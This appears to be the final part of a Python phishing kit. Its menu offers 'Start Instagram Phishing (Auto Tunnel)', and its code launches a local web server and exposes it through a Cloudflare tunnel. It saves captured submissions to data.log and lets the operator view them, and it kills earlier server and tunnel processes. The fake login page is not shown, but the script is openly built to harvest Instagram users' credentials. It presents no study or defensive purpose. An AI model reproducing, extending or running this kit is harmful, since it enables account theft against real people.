        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        print(colored(f"[✓] Server started successfully!\n", Colors.GREEN))

        if not wait_for_server(port, timeout=10):
            print(colored("[!] Server failed to start properly.", Colors.RED))
            return

        url = start_cloudflare_tunnel(port)
        if url:
            print(colored(f"\n📁 Data will be saved in data.log\n", Colors.YELLOW))
            print(colored(f"📁 View logs: tail -f data.log\n\n", Colors.YELLOW))
            print(colored(f"[*] Press Ctrl+C to stop the server\n", Colors.RED))
        else:
            print(colored("\n[!] Cloudflare Tunnel failed to start.", Colors.RED))
            print(colored("You can still access locally at: http://localhost:" + str(port), Colors.YELLOW))
            print(colored("Try manually: cloudflared tunnel --url http://localhost:" + str(port), Colors.YELLOW))

        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(colored("\n\n[!] Server stopped by user\n", Colors.YELLOW))
        if 'cloudflare_process' in globals() and cloudflare_process:
            try:
                cloudflare_process.terminate()
            except:
                pass
    except Exception as e:
        print(colored(f"\n[!] Error: {e}\n", Colors.RED))

# ============================================
# VIEW LOGS
# ============================================
def view_logs():
    if not os.path.exists('data.log'):
        print(colored("\n[!] No logs found yet.\n", Colors.RED))
        return
    clear_screen()
    print(colored("\n========== DATA LOGS ==========\n", Colors.CYAN))
    with open('data.log', 'r', encoding='utf-8') as f:
        print(f.read())
    print(colored("\n================================\n", Colors.CYAN))
    input(colored("Press Enter to continue...", Colors.YELLOW))

# ============================================
# MENU
# ============================================
def show_menu():
    print(colored("[1] Start Instagram Phishing (Auto Tunnel)", Colors.YELLOW))
    print(colored("[2] View Logs", Colors.BLUE))
    print(colored("[3] Exit", Colors.RED))
    print()

def kill_previous_servers():
    if os.name != 'nt':
        os.system('pkill -f "python.*bgmi" 2>/dev/null')
        os.system('pkill -f cloudflared 2>/dev/null')
    else:
        os.system('taskkill /f /im cloudflared.exe 2>nul')

def auto_start():
    port = find_free_port(8000, 8100)
    if not port:
        print(colored("[!] No free ports available in range 8000-8100!", Colors.RED))
        return
    kill_previous_servers()
    start_web_server(port)

# ============================================
# MAIN
# ============================================
def main():
    try:
        if sys.version_info < (3, 6):
            print(colored("Please use Python 3.6 or higher", Colors.RED))
            sys.exit(1)
        show_banner()
        while True:
            show_menu()
            choice = input(colored("Enter your choice [1-3]: ", Colors.BLUE))
            if choice == '1':
                auto_start()
            elif choice == '2':
                view_logs()
            elif choice == '3':
                print(colored("\nExiting... Bye Hacker! 👋\n", Colors.RED))
                kill_previous_servers()
                sys.exit(0)
            else:
                print(colored("\nInvalid choice! Please try again.\n", Colors.RED))
                time.sleep(1)
    except KeyboardInterrupt:
        print(colored("\n\nExiting... Bye Hacker! 👋\n", Colors.RED))
        kill_previous_servers()
        sys.exit(0)

if __name__ == "__main__":
    main()